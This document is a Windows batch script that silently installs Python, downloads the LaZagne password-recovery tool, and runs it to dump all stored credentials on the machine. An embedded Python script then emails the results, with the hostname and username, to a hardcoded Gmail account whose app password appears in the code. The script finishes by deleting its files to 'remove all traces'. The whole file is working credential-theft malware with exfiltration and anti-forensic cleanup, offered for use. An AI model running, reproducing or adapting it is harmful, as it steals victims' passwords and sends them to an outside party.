@echo off
setlocal enabledelayedexpansion

:: Environmental variables for all dependencies
set LAZAGNE_EXE=%TEMP%\LaZagne.exe
set LAZAGNE_DIR=%TEMP%\LaZagne
set RESULTS_FILE=%TEMP%\lazagne_results.txt
set PDF_FILE=%TEMP%\lazagne_results.pdf
set PYTHON_SCRIPT=%TEMP%\lazagne_email.py
set LOG_DIR=%TEMP%\logs

:: Main execution
echo Starting Windows LaZagne operation...
echo This may take several minutes. Please wait...

:: Create log directory
mkdir "%LOG_DIR%" 2>nul

:: Install Python if needed
call :install_python
if !errorlevel! neq 0 (
    echo Python installation failed.
    call :cleanup
    exit /b 1
)

:: Install packages
call :install_packages
if !errorlevel! neq 0 (
    echo Package installation failed.
    call :cleanup
    exit /b 1
)

:: Download LaZagne directly
call :download_lazagne
if !errorlevel! neq 0 (
    echo LaZagne download failed.
    call :cleanup
    exit /b 1
)

:: Create Python email script
call :create_python_script

:: Run LaZagne and capture results
echo Running LaZagne to retrieve stored credentials...
mkdir "%LAZAGNE_DIR%" 2>nul
cd /d "%LAZAGNE_DIR%"
"%LAZAGNE_EXE%" all > "%RESULTS_FILE%" 2>&1

:: Send results via email
echo Sending results via email...
python "%PYTHON_SCRIPT%"

:: Final cleanup
call :cleanup

echo Operation completed successfully. All temporary files cleaned up.
pause
exit /b 0

:: Download LaZagne function
:download_lazagne
echo Downloading LaZagne...
curl -fsSL "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe" -o "%LAZAGNE_EXE%" >nul 2>&1
if !errorlevel! neq 0 (
    echo Failed to download LaZagne.
    exit /b 1
)

if not exist "%LAZAGNE_EXE%" (
    echo LaZagne download failed.
    exit /b 1
)

echo LaZagne downloaded successfully.
exit /b 0

:: Cleanup function to remove all traces
:cleanup
echo Starting cleanup process...

:: Remove installed files and directories
del /f /q "%LAZAGNE_EXE%" "%RESULTS_FILE%" "%PDF_FILE%" "%PYTHON_SCRIPT%" 2>nul
rd /s /q "%LAZAGNE_DIR%" "%LOG_DIR%" 2>nul

:: Remove other temporary files
del /f /q "%TEMP%\LaZagne*" "%TEMP%\lazagne_*" 2>nul
del /f /q "%TEMP%\reportlab*" "%TEMP%\fpdf*" 2>nul

:: Clear Python cache
for /r "%TEMP%" %%f in (*.pyc *.pyo) do del /f /q "%%f" 2>nul
for /d /r "%TEMP%" %%d in (__pycache__) do rd /s /q "%%d" 2>nul

echo Cleanup completed. All traces removed.
goto :eof

:: Install Python if not present
:install_python
echo Checking for Python...
python --version >nul 2>&1
if !errorlevel! equ 0 (
    echo Python is already installed.
    goto :eof
)

echo Installing Python...
curl -fsSL https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -o "%TEMP%\python_installer.exe" >nul 2>&1
if !errorlevel! neq 0 (
    echo Failed to download Python installer.
    exit /b 1
)

:: Silent install Python
start /wait "" "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 >nul 2>&1
del /f /q "%TEMP%\python_installer.exe" 2>nul

:: Refresh PATH to include Python
for %%i in (python.exe) do set "PYTHON_EXE=%%~$PATH:i"
if not defined PYTHON_EXE (
    set PATH=%PATH%;C:\Python310;C:\Python310\Scripts
)

python --version >nul 2>&1
if !errorlevel! neq 0 (
    echo Python installation failed.
    exit /b 1
)

echo Python installed successfully.
goto :eof

:: Install required Python packages
:install_packages
echo Installing required Python packages...

:: Upgrade pip
python -m pip install --upgrade pip --quiet >nul 2>&1

:: Install packages
python -m pip install --quiet reportlab fpdf --quiet >nul 2>&1

:: Check if packages installed successfully
python -c "import reportlab, fpdf" 2>nul
if !errorlevel! neq 0 (
    echo Failed to install required packages.
    exit /b 1
)

echo Packages installed successfully.
goto :eof

:: Create Python script
:create_python_script
(
echo import smtplib, ssl, socket, os, getpass, time
echo from email.mime.text import MIMEText
echo from email.mime.multipart import MIMEMultipart
echo from email.mime.application import MIMEApplication
echo.
echo # Set environmental variables from batch
echo RESULTS_FILE = os.environ.get("RESULTS_FILE", r"%RESULTS_FILE%")
echo PDF_FILE = os.environ.get("PDF_FILE", r"%PDF_FILE%")
echo.
echo # Try to import reportlab with fallback
echo try:
echo     from reportlab.lib.pagesizes import letter
echo     from reportlab.pdfgen import canvas
echo     reportlab_available = True
echo except ImportError:
echo     reportlab_available = False
echo.
echo try:
echo     import fpdf
echo     fpdf_available = True
echo except ImportError:
echo     fpdf_available = False
echo.
echo def send_email(subject, body, attachment_path=None):
echo     try:
echo         gmail_user = "github0987@gmail.com"
echo         gmail_app_password = "gwhl efna quvk qhqj"
echo.        
echo         msg = MIMEMultipart()
echo         msg["From"] = gmail_user
echo         msg["To"] = gmail_user
echo         msg["Subject"] = subject
echo         msg["X-Priority"] = "1"
echo.        
echo         msg.attach(MIMEText(body, "plain"))
echo.        
echo         if attachment_path and os.path.exists(attachment_path):
echo             with open(attachment_path, "rb") as f:
echo                 part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
echo             part["Content-Disposition"] = f"attachment; filename=\\"{os.path.basename(attachment_path)}\\""
echo             msg.attach(part)
echo.        
echo         context = ssl.create_default_context()
echo         with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
echo             server.login(gmail_user, gmail_app_password)
echo             server.sendmail(gmail_user, gmail_user, msg.as_string())
echo         return True
echo     except Exception as e:
echo         print(f"Email error: {e}")
echo         return False
echo.
echo def create_pdf(content, filename):
echo     if reportlab_available:
echo         try:
echo             c = canvas.Canvas(filename, pagesize=letter)
echo             text = c.beginText(40, 750)
echo             text.setFont("Helvetica", 10)
echo.            
echo             lines = []
echo             for line in content.split("\n"):
echo                 while len(line) > 100:
echo                     lines.append(line[:100])
echo                     line = line[100:]
echo                 lines.append(line)
echo.            
echo             for line in lines:
echo                 if text.getY() < 40:
echo                     c.drawText(text)
echo                     c.showPage()
echo                     text = c.beginText(40, 750)
echo                     text.setFont("Helvetica", 10)
echo                 text.textLine(line)
echo.            
echo             c.drawText(text)
echo             c.save()
echo             return True
echo         except Exception as e:
echo             pass
echo.    
echo     if fpdf_available:
echo         try:
echo             pdf = fpdf.FPDF()
echo             pdf.add_page()
echo             pdf.set_font("Arial", size=10)
echo.            
echo             for line in content.split("\n"):
echo                 pdf.cell(0, 5, line[:90], ln=True)
echo.            
echo             pdf.output(filename)
echo             return True
echo         except Exception as e:
echo             pass
echo.    
echo     try:
echo         with open(filename.replace(".pdf", ".txt"), "w") as f:
echo             f.write(content)
echo         return False
echo     except:
echo         return False
echo.
echo # Get system info
echo username = getpass.getuser()
echo hostname = socket.gethostname()
echo system_os = "Windows"
echo.
echo # Read results file
echo lazagne_output = ""
echo try:
echo     with open(RESULTS_FILE, "r", encoding="utf-8", errors="ignore") as f:
echo         lazagne_output = f.read()
echo except:
echo     lazagne_output = "Failed to read results file"
echo.
echo # Create PDF with results
echo pdf_created = create_pdf(lazagne_output, PDF_FILE)
echo.
echo # Send LaZagne results via email with PDF attachment
echo results_subject = "LaZagne Results from " + hostname
echo time_str = time.strftime("%%Y-%%m-%%d %%H:%%M:%%S")
echo results_body = "System: " + hostname + " (" + system_os + ")\nUser: " + username + "\nTime: " + time_str
echo.
echo if pdf_created:
echo     send_email(results_subject, results_body, PDF_FILE)
echo else:
echo     results_body += "\n\nLaZagne Output:\n" + lazagne_output[:1500]
echo     send_email(results_subject, results_body)
echo.
echo # Final success notification
echo time_str = time.strftime("%%Y-%%m-%%d %%H:%%M:%%S")
echo send_email("All Operations Completed", "Complete operation successful on " + hostname + ". System: " + system_os + ", User: " + username + ", Time: " + time_str)
echo.
echo print("All operations completed successfully. Check your email for details.")
) > "%PYTHON_SCRIPT%"

goto :eof
